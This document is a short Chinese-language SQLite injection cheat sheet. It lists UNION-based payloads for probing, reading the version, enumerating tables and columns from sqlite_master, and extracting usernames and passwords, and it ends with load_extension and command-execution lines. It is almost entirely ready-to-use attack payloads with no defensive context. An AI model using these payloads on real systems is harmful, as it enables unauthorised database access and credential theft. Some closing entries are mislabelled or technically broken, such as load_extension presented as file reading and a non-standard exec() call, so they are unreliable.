# SQLite注入

## 基础探测

```sql
' OR '1'='1
' UNION SELECT NULL--
```

## 获取版本

```sql
' UNION SELECT sqlite_version(),NULL--
```

## 获取表名

```sql
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
```

## 获取列名

```sql
' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--
```

## 提取数据

```sql
' UNION SELECT username,password FROM users--
```

## SQLite特性

### ATTACH数据库

```sql
' UNION SELECT name,NULL FROM pragma_database_list--
```

### 文件读取

```sql
' SELECT load_extension('/lib/libsqlite.so')--
```

### 命令执行(如果编译了SQLite扩展)

```sql
' SELECT exec('whoami')--
```
